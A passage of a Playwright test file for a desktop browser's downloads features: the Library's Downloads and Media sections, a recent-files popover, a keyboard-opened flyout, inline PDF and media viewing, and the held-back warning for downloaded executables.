  await lib.getByTestId('downloads-search').fill('nothing like it')
  await expect(lib.getByTestId('downloads-empty')).toHaveText('No downloads match.')
  await lib.getByTestId('downloads-search').press('Escape')
  await expect(lib.getByTestId('library-download')).toHaveCount(4)
  // Files downloaded elsewhere stay off the list: only what was downloaded through Orbit shows.
  expect(readdirSync(folder()).sort()).toEqual(['big.bin', 'data.csv', 'notes.zip', 'photo.png'])
})

test('[DL-10] a row previews its file in a Peek over the Library; ⌘/Ctrl-click opens a tab; others open in their app', async () => {
  const { page } = await openPage()
  await downloadPicture(page, 'photo.png')
  await page.locator('#attachment').click()
  await expect.poll(async () => (await named('data.csv'))?.state).toBe('completed')
  const lib = await openLibrary('downloads')
  await libraryRow(lib, 'photo.png').click()
  await expect.poll(async () => (await overlayKind())?.kind).toBe('peek')
  const peekTab = ((await overlayKind()) as { tabId: string }).tabId
  expect((await state(orbit.app)).tabs[peekTab]?.url).toBe(pathToFileURL(join(folder(), 'photo.png')).href)
  // The Library stays under the Peek.
  expect(((await run(orbit.app, 'library.status')) as { open: boolean }).open).toBe(true)
  await run(orbit.app, 'peek.close')
  await expect.poll(async () => (await overlayKind())?.kind).toBe('none')
  // Not a file Orbit shows: its app opens it.
  await libraryRow(lib, 'data.csv').click()
  await expect.poll(() => hooks((h) => h.opened)).toEqual([join(folder(), 'data.csv')])
  // ⌘/Ctrl-click: a new tab, and the Library makes way.
  const tabs = await tabCount()
  await libraryRow(lib, 'photo.png').click({ modifiers: [isMac ? 'Meta' : 'Control'] })
  await expect.poll(tabCount).toBe(tabs + 1)
  const active = (await state(orbit.app)).tabs[(await activeTabId(orbit.app)) as string]
  expect(active?.url).toBe(pathToFileURL(join(folder(), 'photo.png')).href)
  await expect(lib.getByTestId('library')).toHaveAttribute('data-open', 'false')
})

test('[DL-10][DL-06] rows drag out as the file, show in their folder, and their menu removes them', async () => {
  const { page } = await openPage()
  await page.locator('#attachment').click()
  await expect.poll(async () => (await named('data.csv'))?.state).toBe('completed')
  const lib = await openLibrary('downloads')
  const r = libraryRow(lib, 'data.csv')
  await r.dispatchEvent('dragstart')
  await expect.poll(dragged).toEqual([join(folder(), 'data.csv')])
  await r.hover()
  await r.getByTestId('library-download-show').click()
  await expect.poll(() => hooks((h) => h.shown)).toEqual([join(folder(), 'data.csv')])
  await r.click({ button: 'right' })
  await expect.poll(() => hooks((h) => h.menu())).toContain('Remove from List')
  await clickMenu('Remove from List')
  await expect(lib.getByTestId('library-download')).toHaveCount(0)
  await expect(lib.getByTestId('downloads-empty')).toContainText('No downloads yet')
  expect(existsSync(join(folder(), 'data.csv'))).toBe(true)
  // The sidebar's row drags out too.
  await startDownloads(page, '/file/second.csv?size=100')
  await expect.poll(async () => (await named('second.csv'))?.state).toBe('completed')
  await row('second.csv').getByTestId('download-open').dispatchEvent('dragstart')
  await expect.poll(dragged).toEqual([join(folder(), 'data.csv'), join(folder(), 'second.csv')])
})

test('[DL-08][DL-10] Clear all in the Library leaves the running download; another profile has its own list', async () => {
  const { page } = await openPage()
  await page.locator('#attachment').click()
  await expect.poll(async () => (await named('data.csv'))?.state).toBe('completed')
  await page.locator('#held').click()
  await expect.poll(async () => (await named('big.bin'))?.state).toBe('progressing')
  const lib = await openLibrary('downloads')
  await expect(lib.getByTestId('library-download')).toHaveCount(2)
  await lib.getByTestId('downloads-clear').click()
  await expect(lib.getByTestId('library-download-name')).toHaveText(['big.bin'])
  await expect(lib.getByTestId('library-toast')).toContainText('Cleared 1 download')
  // With a second profile: a switcher, and that profile's (empty) list.
  expect(await lib.getByTestId('downloads-profile').count()).toBe(0)
  await run(orbit.app, 'profiles.create', { name: 'Work' })
  await expect(lib.getByTestId('downloads-profile')).toBeVisible()
  const work = Object.values((await state(orbit.app)).profiles).find((p) => p.name === 'Work')?.id as string
  await lib.getByTestId('downloads-profile').selectOption(work)
  await expect(lib.getByTestId('downloads-empty')).toContainText('No downloads yet')
  await lib.getByTestId('downloads-profile').selectOption('p-default')
  await expect(lib.getByTestId('library-download-name')).toHaveText(['big.bin'])
  server.release('big.bin')
})

test('[DL-09] right after a download the Library opens on Downloads; an open Library stays where it is', async () => {
  const { page } = await openPage()
  await run(orbit.app, 'library.setSection', { section: 'history' })
  await page.locator('#attachment').click()
  await expect
    .poll(async () => ((await run(orbit.app, 'library.status')) as { section: string }).section)
    .toBe('downloads')
  await run(orbit.app, 'library.open', {})
  const lib = await libraryPage()
  await expect(lib.getByTestId('library-section')).toHaveAttribute('data-section-id', 'downloads')
  await expect(libraryRow(lib, 'data.csv')).toBeVisible()
  // Open on another section: a new download leaves it there.
  await lib.locator('[data-testid="library-nav-item"][data-section-id="archive"]').click()
  await startDownloads(page, '/file/more.csv?size=100')
  await expect.poll(async () => (await named('more.csv'))?.state).toBe('completed')
  await expect(lib.getByTestId('library-section')).toHaveAttribute('data-section-id', 'archive')
  // The sections: Media just before Downloads.
  const ids = await lib
    .getByTestId('library-nav-item')
    .evaluateAll((els) => els.map((e) => e.getAttribute('data-section-id')))
  expect(ids.indexOf('media')).toBe(ids.indexOf('downloads') - 1)
})

test('[DL-11] the Media section shows downloaded pictures and videos; videos play silently; a tile previews', async () => {
  const { page } = await openPage()
  await downloadPicture(page, 'photo.png')
  await downloadVideo(page, 'clip.webm')
  await page.locator('#attachment').click()
  await expect.poll(async () => (await named('data.csv'))?.state).toBe('completed')
  const lib = await openLibrary('media')
  // Newest first; the spreadsheet is no picture.
  await expect
    .poll(() => lib.getByTestId('media-tile').evaluateAll((els) => els.map((e) => e.getAttribute('title'))))
    .toEqual(['clip.webm', 'photo.png'])
  const video = lib.getByTestId('media-video')
  expect(await video.evaluate((v: HTMLVideoElement) => v.muted)).toBe(true)
  await expect.poll(() => video.evaluate((v: HTMLVideoElement) => !v.paused && v.currentTime > 0)).toBe(true)
  await expect.poll(() => lib.getByTestId('media-image').evaluate((img: HTMLImageElement) => img.naturalWidth)).toBe(64)
  // Dragging a tile drags the file.
  await lib.locator('[data-testid="media-tile"][title="photo.png"]').dispatchEvent('dragstart')
  await expect.poll(dragged).toEqual([join(folder(), 'photo.png')])
  // A click: a larger preview, over the Library.
  await lib.locator('[data-testid="media-tile"][title="photo.png"]').click()
  await expect.poll(async () => (await overlayKind())?.kind).toBe('peek')
})

test('[DL-11] with reduced motion, video tiles stay still', async () => {
  const { page } = await openPage()
  await downloadVideo(page, 'clip.webm')
  const lib = await openLibrary('downloads')
  await lib.emulateMedia({ reducedMotion: 'reduce' })
  await lib.locator('[data-testid="library-nav-item"][data-section-id="media"]').click()
  await expect(lib.getByTestId('library-section')).toHaveAttribute('data-section-id', 'media')
  const video = lib.getByTestId('media-video')
  await expect(video).toBeVisible()
  await expect.poll(() => video.evaluate((v: HTMLVideoElement) => v.readyState >= 1)).toBe(true)
  expect(await video.evaluate((v: HTMLVideoElement) => v.paused)).toBe(true)
})

test("[DL-05][DL-11] the Library button's menu adds the OS screenshots to the recent files and to Media", async () => {
  const { page } = await openPage()
  await downloadPicture(page, 'photo.png')
  const shots = join(orbit.userData, 'Screenshots')
  mkdirSync(shots, { recursive: true })
  const png = readFileSync(join(folder(), 'photo.png'))
  writeFileSync(join(shots, 'Screenshot 2026-10-10 at 09.41.00.png'), png)
  writeFileSync(join(shots, 'holiday.png'), png)
  const recent = async () => ((await run(orbit.app, 'downloads.recent', {})) as { name: string }[]).map((f) => f.name)
  expect(await recent()).toEqual(['photo.png'])
  await orbit.shell.getByTestId('library-button').click({ button: 'right' })
  await expect
    .poll(() => hooks((h) => h.menu()))
    .toEqual(['Recent Files', 'Downloads', 'Screenshots', 'Show Screenshots in Library'])
  await clickMenu('Screenshots')
  expect((await state(orbit.app)).settings.recentFiles).toEqual({ downloads: true, screenshots: true })
  // The newest first: the screenshot was written after the download.
  await expect.poll(recent).toEqual(['Screenshot 2026-10-10 at 09.41.00.png', 'photo.png'])
  // Media: screenshots only once chosen there.
  const lib = await openLibrary('media')
  await expect(lib.getByTestId('media-tile')).toHaveCount(1)
  await run(orbit.app, 'downloads.libraryMenu', {})
  await clickMenu('Show Screenshots in Library')
  await expect(lib.getByTestId('media-tile')).toHaveCount(2)
  await expect(lib.locator('[data-testid="media-tile"][data-source="screenshot"]')).toHaveAttribute(
    'title',
    'Screenshot 2026-10-10 at 09.41.00.png',
  )
  // Its menu shows the file; dragging it drags the file.
  await lib.locator('[data-testid="media-tile"][data-source="screenshot"]').dispatchEvent('dragstart')
  await expect.poll(dragged).toEqual([join(shots, 'Screenshot 2026-10-10 at 09.41.00.png')])
  await lib.locator('[data-testid="media-tile"][data-source="screenshot"]').click({ button: 'right' })
  await expect.poll(() => hooks((h) => h.menu())).toEqual(['Open', SHOW_IN_FOLDER, 'Copy File'])
  await clickMenu(SHOW_IN_FOLDER)
  await expect.poll(() => hooks((h) => h.shown)).toEqual([join(shots, 'Screenshot 2026-10-10 at 09.41.00.png')])
  // Downloads off: the popover lists screenshots only; the choice is kept.
  await run(orbit.app, 'downloads.libraryMenu', {})
  await clickMenu('Downloads')
  await expect.poll(recent).toEqual(['Screenshot 2026-10-10 at 09.41.00.png'])
})

test('[DL-05] hovering the Library button shows the recent files; one opens on click; they go when the pointer leaves', async () => {
  const { page } = await openPage()
  await page.locator('#attachment').click()
  await expect.poll(async () => (await named('data.csv'))?.state).toBe('completed')
  await downloadPicture(page, 'photo.png')
  const button = orbit.shell.getByTestId('library-button')
  await button.hover()
  const popover = orbit.shell.getByTestId('recent-files')
  await expect(popover).toBeVisible()
  await expect(popover.getByTestId('recent-file')).toHaveCount(2)
  await expect(popover.getByTestId('recent-file').first()).toHaveAttribute('title', 'photo.png')
  await expect
    .poll(() =>
      popover
        .getByTestId('recent-file')
        .first()
        .locator('img')
        .evaluate((i: HTMLImageElement) => i.naturalWidth),
    )
    .toBe(64)
  // Inside the sidebar, above the button.
  const box = await popover.boundingBox()
  const bar = await button.boundingBox()
  const sidebar = await orbit.shell.getByTestId('sidebar').boundingBox()
  expect(box && bar && sidebar).toBeTruthy()
  if (box && bar && sidebar) {
    expect(box.y + box.height).toBeLessThanOrEqual(bar.y + FRAME_SLACK)
    expect(box.x + box.width).toBeLessThanOrEqual(sidebar.x + sidebar.width + FRAME_SLACK)
  }
  // Onto the popover and off it: it goes after a moment.
  await popover.getByTestId('recent-file').first().hover()
  await expect(popover).toBeVisible()
  await orbit.shell.mouse.move(sidebar ? sidebar.x + sidebar.width / 2 : 100, 40)
  await expect(popover).toBeHidden()
  // A click opens the file (one Orbit doesn't show opens in its app).
  await button.hover()
  await popover.locator('[data-testid="recent-file"][title="data.csv"]').click()
  await expect.poll(() => hooks((h) => h.opened)).toEqual([join(folder(), 'data.csv')])
  await expect(popover).toBeHidden()
  // Dragging one drags the file.
  await orbit.shell.mouse.move(sidebar ? sidebar.x + sidebar.width / 2 : 100, 40)
  await button.hover()
  await popover.locator('[data-testid="recent-file"][title="photo.png"]').dispatchEvent('dragstart')
  await expect.poll(dragged).toEqual([join(folder(), 'photo.png')])
})

test('[DL-14] the Downloads keys: the flyout beside the sidebar on Windows and Linux, the Library on macOS', async () => {
  const { tabId, page } = await openPage()
  await page.locator('#attachment').click()
  await expect.poll(async () => (await named('data.csv'))?.state).toBe('completed')
  await page.locator('#held').click()
  await expect.poll(async () => (await named('big.bin'))?.receivedBytes).toBe(2 * MB)
  // Pressed in the page, as a person would (Playwright's own key presses come in below Orbit's keys).
  if (isMac) {
    await pressInTab(orbit.app, tabId, 'Mod+Alt+L')
    const lib = await libraryPage()
    await expect(lib.getByTestId('library-section')).toHaveAttribute('data-section-id', 'downloads')
    await run(orbit.app, 'library.close')
    await pressInTab(orbit.app, tabId, 'Shift+Mod+J')
    await expect(lib.getByTestId('library')).toHaveAttribute('data-open', 'true')
    server.release('big.bin')
    return
  }
  await pressInTab(orbit.app, tabId, 'Mod+J')
  const overlay = await viewPage(orbit.app, 'overlay')
  const flyout = overlay.getByTestId('downloads-flyout')
  await expect(flyout).toBeVisible()
  await expect(flyout.getByTestId('flyout-download-name')).toHaveText(['big.bin', 'data.csv'])
  await expect(flyout.locator('[data-testid="flyout-download"][title="big.bin"]')).toContainText('2 MB of 4 MB')
  // Beside the sidebar, at the top.
  const win = (await state(orbit.app)).windows[Object.keys((await state(orbit.app)).windows)[0] as string]
  const box = await flyout.boundingBox()
  expect(box?.x).toBeGreaterThanOrEqual((win?.sidebar.width ?? 0) - FRAME_SLACK)
  expect(box?.y).toBeLessThan(40)
  // Live progress.
  server.release('big.bin')
  await expect(flyout.locator('[data-testid="flyout-download"][title="big.bin"]')).toContainText('4 MB')
  // Show in folder, drag out; Esc closes it.
  await flyout.locator('[data-testid="flyout-download"][title="data.csv"]').hover()
  await flyout.locator('[data-testid="flyout-download"][title="data.csv"]').getByTestId('flyout-download-show').click()
  await expect.poll(() => hooks((h) => h.shown)).toEqual([join(folder(), 'data.csv')])
  await overlay.keyboard.press('Escape')
  await expect.poll(async () => (await overlayKind())?.kind).toBe('none')
  // Again: a click opens a file, and the flyout makes way.
  await pressInTab(orbit.app, tabId, 'Mod+J')
  await expect(flyout).toBeVisible()
  await flyout.locator('[data-testid="flyout-download"][title="data.csv"]').click()
  await expect.poll(() => hooks((h) => h.opened)).toEqual([join(folder(), 'data.csv')])
  await expect.poll(async () => (await overlayKind())?.kind).toBe('none')
  // Ctrl+J again (the flyout has the keyboard) closes it.
  await pressInTab(orbit.app, tabId, 'Mod+J')
  await expect(flyout).toBeVisible()
  await expect.poll(focusedUrl).toContain('view=overlay')
  expect(await pressFocused('Mod+J')).toContain('view=overlay')
  await expect.poll(async () => (await overlayKind())?.kind).toBe('none')
  await expect(flyout).toHaveCount(0)
  // Show All: the Library's Downloads section.
  await pressInTab(orbit.app, tabId, 'Mod+J')
  await flyout.getByTestId('flyout-show-all').click()
  const lib = await libraryPage()
  await expect(lib.getByTestId('library-section')).toHaveAttribute('data-section-id', 'downloads')
  await expect(lib.getByTestId('library')).toHaveAttribute('data-open', 'true')
  await expect.poll(async () => (await overlayKind())?.kind).toBe('none')
  // On macOS the keys open the Library's Downloads section (tried here as if on a Mac).
  await run(orbit.app, 'library.setSection', { section: 'archive' })
  await run(orbit.app, 'library.close')
  await orbit.app.evaluate(() => {
    ;(globalThis as unknown as { __orbitDownloads: { platform?: string } }).__orbitDownloads.platform = 'darwin'
  })
  await action(orbit.app, 'app.downloads')
  await expect(lib.getByTestId('library')).toHaveAttribute('data-open', 'true')
  await expect(lib.getByTestId('library-section')).toHaveAttribute('data-section-id', 'downloads')
})

test('[DL-14] the command bar has a "Downloads" action, with its keys', async () => {
  await orbit.shell.keyboard.press(`${MOD}+T`)
  const overlay = await viewPage(orbit.app, 'overlay')
  const input = overlay.getByTestId('command-input')
  await expect(input).toBeFocused()
  await input.fill('downloads')
  const result = overlay.locator('[data-testid="command-result"][data-id="action:app.downloads"]')
  await expect(result.getByTestId('command-result-title')).toHaveText('Downloads')
  await expect(result.getByTestId('command-shortcut')).toHaveText(isMac ? '⇧⌘J' : 'Ctrl+J')
  await result.click()
  if (isMac) {
    const lib = await libraryPage()
    await expect(lib.getByTestId('library')).toHaveAttribute('data-open', 'true')
    await expect(lib.getByTestId('library-section')).toHaveAttribute('data-section-id', 'downloads')
    return
  }
  await expect(overlay.getByTestId('downloads-flyout')).toBeVisible()
  await expect(overlay.getByTestId('flyout-empty')).toHaveText('No downloads yet')
  expect((await overlayKind())?.kind).toBe('panel')
})

test('[DL-12] a program waits in its row until kept or discarded; only a kept one is put in place', async () => {
  const { page } = await openPage()
  await startDownloads(page, '/file/setup.exe?size=2048')
  await expect.poll(async () => (await named('setup.exe'))?.danger).toBe('file-type')
  expect((await entry('setup.exe')).state).toBe('completed')
  expect(existsSync(join(folder(), 'setup.exe'))).toBe(false)
  expect(sizeOf(join(folder(), 'setup.exe.crdownload'))).toBe(2048)
  const r = row('setup.exe')
  await expect(r.getByTestId('download-meta')).toHaveText('Can harm your computer')
  expect(await menuOf(await idOf('setup.exe'))).toEqual(['Keep', 'Discard', 'Copy Download Link'])
  // It waits through a restart.
  const { userData } = orbit
  await orbit.app.close()
  orbit = await launchOrbit({ userData })
  await expect(row('setup.exe').getByTestId('download-keep')).toBeVisible()
  await row('setup.exe').getByTestId('download-keep').click()
  await expect.poll(() => sizeOf(join(folder(), 'setup.exe'))).toBe(2048)
  expect(existsSync(join(folder(), 'setup.exe.crdownload'))).toBe(false)
  expect((await entry('setup.exe')).danger).toBeUndefined()
  await expect(row('setup.exe').getByTestId('download-meta')).toHaveText(/^Done/)
  // Discard deletes it.
  const again = await openPage()
  await startDownloads(again.page, '/file/tool.exe?size=1024')
  await expect.poll(async () => (await named('tool.exe'))?.danger).toBe('file-type')
  const lib = await openLibrary('downloads')
  await expect(libraryRow(lib, 'tool.exe').getByTestId('library-download-status')).toHaveText('Can harm your computer')
  await libraryRow(lib, 'tool.exe').getByTestId('library-download-discard').click()
  await expect.poll(async () => named('tool.exe')).toBeUndefined()
  expect(readdirSync(folder()).filter((f) => f.startsWith('tool'))).toEqual([])
  await expect(row('tool.exe')).toHaveCount(0)
})

// ---- DL-13: files the browser shows ----

test('[DL-13] PDFs, pictures, text, audio and video open in a tab, not as downloads', async () => {
  for (const name of ['doc.pdf', 'dot.png', 'notes.txt', 'clip.webm', 'song.mp3']) {
    await run(orbit.app, 'tabs.create', { url: server.url(`/inline/${name}`) })
    const page = await tabPage(orbit.app, `/inline/${name}`)
    if (name.endsWith('.pdf')) {
      // The PDF viewer.
      await expect.poll(() => page.frames().some((f) => f.url().startsWith('chrome-extension://'))).toBe(true)
    } else if (name.endsWith('.png')) {
      await expect.poll(() => page.evaluate(() => document.querySelector('img')?.naturalWidth)).toBe(1)
    } else if (name.endsWith('.txt')) {
      await expect.poll(() => page.evaluate(() => document.body.innerText.trim())).toBe('Plain text, shown as it is.')
    } else {
      // A media page (a player, even for these made-up bytes).
      await expect.poll(() => page.evaluate(() => !!document.querySelector('video, audio'))).toBe(true)
    }
  }
  // None went to Downloads. (A site that says "attachment" still downloads: DL-01.)
  expect(await list()).toEqual([])
  expect(existsSync(folder()) ? readdirSync(folder()) : []).toEqual([])
})

test("[DL-13] the PDF viewer's download button saves the file the usual way", async () => {
  await run(orbit.app, 'tabs.create', { url: server.url('/inline/doc.pdf') })
  const page = await tabPage(orbit.app, '/inline/doc.pdf')
  await expect.poll(() => page.frames().some((f) => f.url().startsWith('chrome-extension://'))).toBe(true)
  const viewer = page.frames().find((f) => f.url().startsWith('chrome-extension://'))
  await viewer?.locator('viewer-download-controls #save').click()
  await expect.poll(async () => (await named('doc.pdf'))?.state).toBe('completed')
  expect(readFileSync(join(folder(), 'doc.pdf')).equals(PDF)).toBe(true)
  // It flies to the Library button and shows in the sidebar like any other (DL-02, DL-03).
  await expect(row('doc.pdf')).toBeVisible()
})
